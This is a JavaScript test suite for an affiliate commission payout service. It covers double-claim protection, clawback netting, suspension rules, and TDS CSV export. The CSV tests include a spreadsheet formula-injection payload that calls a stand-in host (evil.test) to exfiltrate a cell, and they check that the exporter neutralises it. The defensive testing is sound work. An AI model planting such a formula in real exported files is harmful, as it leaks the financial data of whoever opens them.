/**
 * Payout batching — the point where money actually leaves the bank.
 *
 * The invariant that matters most is the DOUBLE-CLAIM: two admins clicking "Pay" at the
 * same moment must produce one payout, not two, because the second one would be a real
 * transfer of real money for commissions that were already settled. The guard is the
 * commission rows' `payout: null`, not a lock, so it has to be exercised concurrently
 * to be worth anything.
 */

import mongoose from 'mongoose';
import { readdirSync } from 'fs';
import path from 'path';
import { fileURLToPath, pathToFileURL } from 'url';
import affiliatePayoutService from '../services/affiliatePayoutService.js';
import affiliateService from '../services/affiliateService.js';
import affiliateCommissionRepository from '../repositories/affiliateCommissionRepository.js';
import AffiliateCommission from '../models/AffiliateCommission.js';
import AffiliatePayout from '../models/AffiliatePayout.js';
import Affiliate from '../models/Affiliate.js';
import {
  COMMISSION_STATUS,
  COMMISSION_TYPE,
  MIN_PAYOUT_RUPEES,
  PAYOUT_STATUS,
} from '../config/affiliate.js';
import { ensureCriticalIndexes } from '../config/db.js';

const oid = () => new mongoose.Types.ObjectId();
const MODELS_DIR = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'models');

beforeAll(async () => {
  process.env.AFFILIATE_COMMISSION_ENABLED = 'true';
  for (const entry of readdirSync(MODELS_DIR, { withFileTypes: true })) {
    if (!entry.isFile() || !entry.name.endsWith('.js')) continue;
    await import(pathToFileURL(path.join(MODELS_DIR, entry.name)).href);
  }
  for (const model of Object.values(mongoose.models)) {
    await model.createCollection().catch(() => {});
    await model.syncIndexes().catch(() => {});
  }
  expect((await ensureCriticalIndexes()).ok).toBe(true);
}, 180000);

afterAll(() => { delete process.env.AFFILIATE_COMMISSION_ENABLED; });

let affiliate;
beforeEach(async () => {
  affiliate = await Affiliate.create({
    code: 'RAHUL10', name: 'Rahul', email: 'rahul@example.com',
    status: 'active', commissionPercent: 10, discountPercent: 5,
    payoutDetails: {
      accountHolderName: 'Rahul Nair',
      accountNumber: '123456789012',
      accountLast4: '9012',
      ifsc: 'HDFC0001234',
      panNumber: 'ABCDE1234F',
    },
  });
});

/** An approved, unclaimed commission row worth `amountPaise`. */
const approvedRow = (amountPaise, overrides = {}) =>
  AffiliateCommission.create({
    affiliate: affiliate._id,
    order: oid(),
    type: COMMISSION_TYPE.ACCRUAL,
    amountPaise,
    basePaise: amountPaise * 10,
    percent: 10,
    status: COMMISSION_STATUS.APPROVED,
    approvedAt: new Date(),
    ...overrides,
  });

const ABOVE_FLOOR = MIN_PAYOUT_RUPEES * 100 + 50000; // comfortably over the minimum

/*
  ── The payout QUEUE and the payout REQUEST ───────────────────────────────────────
  Neither moves money. They exist because nothing used to tell anyone a payout was due:
  the affiliate had no way to ask, and the admin had no list — you had to open every
  affiliate's detail page in turn to discover who was owed. That is how commission
  quietly goes unpaid, which is the fastest way to lose an affiliate.
*/
describe('payout queue', () => {
  const otherAffiliate = async (over = {}) => Affiliate.create({
    code: `X${Math.random().toString(36).slice(2, 8).toUpperCase()}`,
    name: 'Other', email: `${Math.random().toString(36).slice(2)}@example.com`,
    status: 'active', commissionPercent: 10, discountPercent: 5, ...over,
  });

  const rowFor = (aff, amountPaise, over = {}) => AffiliateCommission.create({
    affiliate: aff._id, order: oid(), type: COMMISSION_TYPE.ACCRUAL,
    amountPaise, basePaise: Math.abs(amountPaise) * 10, percent: 10,
    status: COMMISSION_STATUS.APPROVED, approvedAt: new Date(), ...over,
  });

  it('lists only affiliates at or above the minimum', async () => {
    await approvedRow(ABOVE_FLOOR);              // due
    const small = await otherAffiliate();
    await rowFor(small, 5000);                   // ₹50 — nowhere near the floor

    const { rows } = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
    });
    const ids = rows.map((r) => String(r._id));
    expect(ids).toContain(String(affiliate._id));
    expect(ids).not.toContain(String(small._id));
  });

  it('nets clawbacks BEFORE applying the threshold', async () => {
    /*
      The case that would otherwise pay out money we are owed back. A clawback is a
      negative row in the same {approved, payout:null} set, so someone whose refunds
      outweigh their earnings must drop OUT of the queue — not appear owed their gross.
    */
    await approvedRow(ABOVE_FLOOR);
    await rowFor(affiliate, -ABOVE_FLOOR, { type: COMMISSION_TYPE.CLAWBACK });

    const { rows } = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
    });
    expect(rows.map((r) => String(r._id))).not.toContain(String(affiliate._id));
  });

  it('ignores rows already claimed by a payout', async () => {
    await approvedRow(ABOVE_FLOOR);
    await affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() });

    const { rows } = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
    });
    expect(rows.map((r) => String(r._id))).not.toContain(String(affiliate._id));
  });

  /*
    ── The review findings, pinned ─────────────────────────────────────────────────
    Each of these is a bug that shipped in the first cut of this feature.
  */

  it('EXCLUDES a suspended affiliate from the worklist', async () => {
    // The money bug: a fraud-suspended affiliate appeared in the queue and could be
    // batched and paid, while requestPayout refused them. The two halves disagreed.
    await approvedRow(ABOVE_FLOOR);
    await Affiliate.updateOne({ _id: affiliate._id }, { $set: { status: 'suspended' } });

    const res = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
    });
    expect(res.rows.map((r) => String(r._id))).not.toContain(String(affiliate._id));
    // Excluded from the worklist, but NOT hidden — the liability is still reported.
    expect(res.suspendedHeld.count).toBe(1);
    expect(res.suspendedHeld.heldPaise).toBe(ABOVE_FLOOR);
    expect(res.totalPayablePaise).toBe(0);
  });

  it('sorts requesters FIRST, and does so before the limit truncates', async () => {
    /*
      The ordering bug. Priority used to be applied in JS after Mongo had already sorted
      by balance and cut the page, so a requester with the smallest qualifying balance was
      dropped before the priority sort ever saw them.
    */
    const rich = await otherAffiliate();
    await rowFor(rich, ABOVE_FLOOR * 5);          // biggest balance, has NOT asked
    await approvedRow(MIN_PAYOUT_RUPEES * 100);   // smallest qualifying, HAS asked
    await Affiliate.updateOne({ _id: affiliate._id }, { $set: { payoutRequestedAt: new Date() } });

    const { rows } = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
      limit: 1, // room for exactly one — the requester must win it
    });
    expect(rows).toHaveLength(1);
    expect(String(rows[0]._id)).toBe(String(affiliate._id));
  });

  it('totals EVERY due affiliate, not just the returned page', async () => {
    // "N due · ₹X total" is read as the outstanding liability. Summing one page
    // understates it the moment more people are due than fit.
    const b = await otherAffiliate();
    const c = await otherAffiliate();
    await approvedRow(ABOVE_FLOOR);
    await rowFor(b, ABOVE_FLOOR);
    await rowFor(c, ABOVE_FLOOR);

    const res = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
      limit: 1,
    });
    expect(res.rows).toHaveLength(1);
    expect(res.dueCount).toBe(3);
    expect(res.totalPayablePaise).toBe(ABOVE_FLOOR * 3);
  });

  it('never carries bank details or PAN through the $lookup', async () => {
    // $lookup bypasses Mongoose, so `select: false` does not protect these — only the
    // projection inside the sub-pipeline does.
    await approvedRow(ABOVE_FLOOR);
    const res = await affiliateCommissionRepository.payableQueue({
      minPaise: MIN_PAYOUT_RUPEES * 100,
    });
    const dump = JSON.stringify(res);
    expect(dump).not.toContain('panNumber');
    expect(dump).not.toContain('accountNumber');
    expect(res.rows[0].affiliate.payoutDetails?.accountLast4).toBe('9012');
  });

  it('computes balances for many affiliates in ONE aggregation', async () => {
    // Guards the N+1 this replaced: rendering the admin list must not cost one
    // aggregation per row.
    const b = await otherAffiliate();
    await approvedRow(30000);
    await rowFor(b, 70000);

    const map = await affiliateCommissionRepository.payableBalancesFor([affiliate._id, b._id, oid()]);
    expect(map.get(String(affiliate._id)).netPaise).toBe(30000);
    expect(map.get(String(b._id)).netPaise).toBe(70000);
    // An affiliate with no payable rows is absent, not zero — callers default.
    expect(map.size).toBe(2);
  });
});

describe('requestPayout', () => {
  const userId = oid();

  beforeEach(async () => {
    await Affiliate.updateOne({ _id: affiliate._id }, { $set: { user: userId } });
  });

  it('records the request and snapshots the balance they saw', async () => {
    await approvedRow(ABOVE_FLOOR);
    const { alreadyRequested } = await affiliateService.requestPayout(userId);

    expect(alreadyRequested).toBe(false);
    const live = await Affiliate.findById(affiliate._id);
    expect(live.payoutRequestedAt).toBeTruthy();
    expect(live.payoutRequestedBalancePaise).toBe(ABOVE_FLOOR);
  });

  it('refuses below the minimum rather than creating an expectation', async () => {
    await approvedRow(5000); // ₹50
    await expect(affiliateService.requestPayout(userId)).rejects.toThrow(/at least/i);

    const live = await Affiliate.findById(affiliate._id);
    expect(live.payoutRequestedAt).toBeNull();
  });

  it('refuses a suspended affiliate', async () => {
    await approvedRow(ABOVE_FLOOR);
    await Affiliate.updateOne({ _id: affiliate._id }, { $set: { status: 'suspended' } });
    await expect(affiliateService.requestPayout(userId)).rejects.toThrow(/not active/i);
  });

  it('is idempotent — a double tap does not restart the clock', async () => {
    await approvedRow(ABOVE_FLOOR);
    const first = await affiliateService.requestPayout(userId);
    const firstAt = (await Affiliate.findById(affiliate._id)).payoutRequestedAt;

    const second = await affiliateService.requestPayout(userId);
    expect(first.alreadyRequested).toBe(false);
    expect(second.alreadyRequested).toBe(true);

    const secondAt = (await Affiliate.findById(affiliate._id)).payoutRequestedAt;
    expect(secondAt.getTime()).toBe(firstAt.getTime());
  });

  it('never moves money — no payout and no row change', async () => {
    // The whole point of the field. If this ever fails, the signal has become an action.
    await approvedRow(ABOVE_FLOOR);
    await affiliateService.requestPayout(userId);

    expect(await AffiliatePayout.countDocuments({ affiliate: affiliate._id })).toBe(0);
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(ABOVE_FLOOR);
    const rows = await AffiliateCommission.find({ affiliate: affiliate._id });
    expect(rows.every((r) => r.status === COMMISSION_STATUS.APPROVED && r.payout === null)).toBe(true);
  });

  it('building the batch CLEARS the request', async () => {
    /*
      Otherwise the affiliate stays pinned to the top of the admin queue after the money
      has already been batched — which is how a second admin, trusting the queue, pays
      the same person twice.
    */
    await approvedRow(ABOVE_FLOOR);
    await affiliateService.requestPayout(userId);
    expect((await Affiliate.findById(affiliate._id)).payoutRequestedAt).toBeTruthy();

    await affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() });

    const live = await Affiliate.findById(affiliate._id);
    expect(live.payoutRequestedAt).toBeNull();
    expect(live.payoutRequestedBalancePaise).toBeNull();
  });

  it('refuses a caller who is not an affiliate', async () => {
    await expect(affiliateService.requestPayout(oid())).rejects.toThrow(/not an affiliate/i);
  });

  it('suspending CLEARS an outstanding request', async () => {
    /*
      The queue sorts requesters first, so a request surviving suspension would put the
      one affiliate an admin has just decided not to trust at the top of the payment
      worklist the moment they were reinstated.
    */
    await approvedRow(ABOVE_FLOOR);
    await affiliateService.requestPayout(userId);
    expect((await Affiliate.findById(affiliate._id)).payoutRequestedAt).toBeTruthy();

    await affiliateService.suspend(affiliate._id, 'smoke test');

    const live = await Affiliate.findById(affiliate._id);
    expect(live.payoutRequestedAt).toBeNull();
    expect(live.payoutRequestedBalancePaise).toBeNull();
  });
});

describe('buildBatch refuses a non-active affiliate', () => {
  /*
    Filtering the QUEUE is not enough on its own: POST /admin/:id/payouts is directly
    callable, and without this guard an admin (or a stale bookmark) could batch and pay
    someone suspended for fraud — while requestPayout refused that same person.
  */
  it.each(['suspended', 'pending', 'rejected'])('refuses status "%s"', async (status) => {
    await approvedRow(ABOVE_FLOOR);
    await Affiliate.updateOne({ _id: affiliate._id }, { $set: { status } });

    await expect(affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() }))
      .rejects.toThrow(new RegExp(status, 'i'));

    // And nothing was claimed on the way out.
    expect(await AffiliatePayout.countDocuments({ affiliate: affiliate._id })).toBe(0);
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id))
      .toBe(ABOVE_FLOOR);
  });

  it('pays them once REINSTATED — suspension does not void earned commission', async () => {
    // The other half of the rule: the money is still theirs, it just takes a decision.
    await approvedRow(ABOVE_FLOOR);
    // `reinstate` refuses an affiliate that was never approved, and it proves that by
    // looking for the managed coupon — so the fixture needs one to be reinstatable.
    await Affiliate.updateOne({ _id: affiliate._id }, { $set: { coupon: oid() } });
    await affiliateService.suspend(affiliate._id, 'review');
    await expect(affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() }))
      .rejects.toThrow(/suspended/i);

    await affiliateService.reinstate(affiliate._id);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() });
    expect(payout.grossPaise).toBe(ABOVE_FLOOR);
  });
});

describe('buildBatch', () => {
  it('claims every approved row and totals from the rows it claimed', async () => {
    await approvedRow(ABOVE_FLOOR);
    await approvedRow(20000);

    const payout = await affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() });

    expect(payout.grossPaise).toBe(ABOVE_FLOOR + 20000);
    expect(payout.netPaise).toBe(ABOVE_FLOOR + 20000); // 0% TDS by default
    expect(payout.commissionCount).toBe(2);
    expect(payout.status).toBe(PAYOUT_STATUS.DRAFT);

    const rows = await AffiliateCommission.find({ payout: payout._id });
    expect(rows).toHaveLength(2);
    expect(rows.every((r) => r.status === COMMISSION_STATUS.PAID)).toBe(true);
    // Nothing payable is left behind.
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(0);
  });

  it('leaves pending rows alone — only what has matured is payable', async () => {
    await approvedRow(ABOVE_FLOOR);
    await approvedRow(999999, { status: COMMISSION_STATUS.PENDING });

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.grossPaise).toBe(ABOVE_FLOOR);
    expect(payout.commissionCount).toBe(1);
  });

  /*
    ⚠️ THE invariant. Two admins clicking Pay at the same instant. The claim lives in
    `{status:'approved', payout:null}`, so the loser's updateMany matches zero rows,
    the transaction aborts, and its empty payout is rolled back — exactly one document
    with money on it survives.
  */
  it('produces ONE payout under two concurrent builds; the loser 409s', async () => {
    await approvedRow(ABOVE_FLOOR);

    const results = await Promise.allSettled([
      affiliatePayoutService.buildBatch(affiliate._id),
      affiliatePayoutService.buildBatch(affiliate._id),
    ]);

    const fulfilled = results.filter((r) => r.status === 'fulfilled');
    const rejected = results.filter((r) => r.status === 'rejected');
    expect(fulfilled).toHaveLength(1);
    expect(rejected).toHaveLength(1);
    expect(rejected[0].reason.statusCode).toBe(409);

    // Exactly one payout carrying money, and the sum of its rows equals its gross.
    const payouts = await AffiliatePayout.find({ grossPaise: { $gt: 0 } });
    expect(payouts).toHaveLength(1);
    const rows = await AffiliateCommission.find({ payout: payouts[0]._id });
    expect(rows.reduce((s, r) => s + r.amountPaise, 0)).toBe(payouts[0].grossPaise);
  });

  it('refuses a balance below the minimum payout', async () => {
    await approvedRow(100); // ₹1

    await expect(affiliatePayoutService.buildBatch(affiliate._id))
      .rejects.toMatchObject({ statusCode: 400 });
    // And nothing was claimed — the rows stay payable.
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(100);
  });

  it('refuses when there is nothing approved at all', async () => {
    await expect(affiliatePayoutService.buildBatch(affiliate._id)).rejects.toBeTruthy();
    expect(await AffiliatePayout.countDocuments({})).toBe(0);
  });

  /*
    The debt case, end to end. A refund that landed after a payout wrote a negative
    approved row; it nets off the next batch automatically, with no special code path.
  */
  it('nets a carried-forward debt off the next batch', async () => {
    await approvedRow(ABOVE_FLOOR);
    await approvedRow(-30000, { type: COMMISSION_TYPE.CLAWBACK });

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.grossPaise).toBe(ABOVE_FLOOR - 30000);
  });

  it('refuses to pay an affiliate whose net balance is negative', async () => {
    await approvedRow(-5000, { type: COMMISSION_TYPE.CLAWBACK });

    await expect(affiliatePayoutService.buildBatch(affiliate._id))
      .rejects.toMatchObject({ statusCode: 400 });
    // The debt is still standing, ready to be netted off future earnings.
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(-5000);
  });

  it('records TDS as a deduction, floored, without deriving the rate', async () => {
    affiliate.tdsPercent = 5;
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.tdsPercent).toBe(5);
    expect(payout.tdsPaise).toBe(Math.floor(ABOVE_FLOOR * 5 / 100));
    expect(payout.netPaise).toBe(payout.grossPaise - payout.tdsPaise);
  });

  /*
    The bank snapshot identifies the destination account without copying financial PII
    into a second, longer-lived collection.
  */
  it('snapshots only the last four digits, never the account number or PAN', async () => {
    await approvedRow(ABOVE_FLOOR);

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.bankSnapshot.accountLast4).toBe('9012');
    expect(payout.bankSnapshot.ifsc).toBe('HDFC0001234');
    const serialised = JSON.stringify(payout);
    expect(serialised).not.toMatch(/123456789012/);
    expect(serialised).not.toMatch(/ABCDE1234F/);
  });
});

describe('markPaid', () => {
  const build = async () => {
    await approvedRow(ABOVE_FLOOR);
    return affiliatePayoutService.buildBatch(affiliate._id);
  };

  it('records the transfer', async () => {
    const payout = await build();

    const paid = await affiliatePayoutService.markPaid(payout._id, {
      reference: 'UTR123456', method: 'neft', adminId: oid(),
    });

    expect(paid.status).toBe(PAYOUT_STATUS.PAID);
    expect(paid.reference).toBe('UTR123456');
    expect(paid.paidAt).toBeTruthy();
  });

  it('409s on a second attempt — one transfer is recorded once', async () => {
    const payout = await build();
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR1' });

    await expect(affiliatePayoutService.markPaid(payout._id, { reference: 'UTR2' }))
      .rejects.toMatchObject({ statusCode: 409 });
  });

  /*
    The same UTR against two payouts means one bank transfer booked as two payments —
    the books would then say we paid twice as much as we did.
  */
  it('409s when the same bank reference is reused on another payout', async () => {
    const first = await build();
    await affiliatePayoutService.markPaid(first._id, { reference: 'UTR-SAME' });

    await approvedRow(ABOVE_FLOOR);
    const second = await affiliatePayoutService.buildBatch(affiliate._id);

    await expect(affiliatePayoutService.markPaid(second._id, { reference: 'UTR-SAME' }))
      .rejects.toMatchObject({ statusCode: 409 });
  });

  it('requires a reference', async () => {
    const payout = await build();
    await expect(affiliatePayoutService.markPaid(payout._id, {}))
      .rejects.toMatchObject({ statusCode: 400 });
  });
});

describe('markFailed', () => {
  it('releases the rows back into the payable pool', async () => {
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(0);

    const failed = await affiliatePayoutService.markFailed(payout._id, {
      failureReason: 'Beneficiary account closed',
    });

    expect(failed.status).toBe(PAYOUT_STATUS.FAILED);
    const rows = await AffiliateCommission.find({ affiliate: affiliate._id });
    expect(rows.every((r) => r.status === COMMISSION_STATUS.APPROVED)).toBe(true);
    expect(rows.every((r) => r.payout === null)).toBe(true);
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(ABOVE_FLOOR);
  });

  it('lets the released rows be re-batched', async () => {
    await approvedRow(ABOVE_FLOOR);
    const first = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markFailed(first._id, {});

    const second = await affiliatePayoutService.buildBatch(affiliate._id);
    expect(second.grossPaise).toBe(ABOVE_FLOOR);
  });

  it('refuses to fail a payout that was already marked paid', async () => {
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR9' });

    await expect(affiliatePayoutService.markFailed(payout._id, {}))
      .rejects.toMatchObject({ statusCode: 409 });
    // The rows stay claimed — that money really did leave the bank.
    const rows = await AffiliateCommission.find({ affiliate: affiliate._id });
    expect(rows.every((r) => r.status === COMMISSION_STATUS.PAID)).toBe(true);
  });
});

describe('exportTdsCsv', () => {
  it('exports only paid payouts, with the PAN read from the affiliate', async () => {
    affiliate.tdsPercent = 5;
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR-CSV' });

    // A draft that never landed must not appear — it is not a payment.
    await approvedRow(ABOVE_FLOOR);
    await affiliatePayoutService.buildBatch(affiliate._id);

    const csv = await affiliatePayoutService.exportTdsCsv();
    const lines = csv.split('\n');

    expect(lines[0]).toContain('PAN');
    expect(lines).toHaveLength(2); // header + the one PAID payout
    expect(lines[1]).toContain('ABCDE1234F');
    expect(lines[1]).toContain('UTR-CSV');
  });

  /*
    ⚠️ SPREADSHEET FORMULA INJECTION. `affiliate.name` comes from the unauthenticated
    application form, and this file is opened in Excel by someone in finance next to a
    column of PANs. Quoting alone does not help: Excel strips the quotes, then parses, so
    `=HYPERLINK(...)` or `=WEBSERVICE(...)` evaluates on open and can exfiltrate the row
    it sits in. A leading apostrophe forces the cell to text.
  */
  it.each([
    ['=', '=WEBSERVICE("http://evil.test/?d="&A1)'],
    ['+', '+1+1'],
    ['-', '-2+3'],
    ['@', '@SUM(1:1)'],
  ])('neutralises a name starting with %s', async (_lead, name) => {
    affiliate.name = name;
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: `UTR-${_lead}` });

    const csv = await affiliatePayoutService.exportTdsCsv();

    // The cell is quoted AND apostrophe-prefixed. Internal quotes are doubled by the
    // CSV escaping, so compare against the escaped form rather than the raw name.
    const nameCell = `"'${name.replace(/"/g, '""')}"`;
    expect(csv).toContain(nameCell);

    // No cell may BEGIN with a formula lead-in once the quote is stripped.
    for (const cell of csv.split('\n')[1].split(',')) {
      expect(cell.replace(/^"/, '')[0]).not.toMatch(/[=+\-@]/);
    }
  });

  it('escapes quotes so a name with a comma cannot shift the columns', async () => {
    affiliate.name = 'Nair, Rahul "RN"';
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR-ESC' });

    const csv = await affiliatePayoutService.exportTdsCsv();
    expect(csv).toContain('"Nair, Rahul ""RN"""');
  });
});
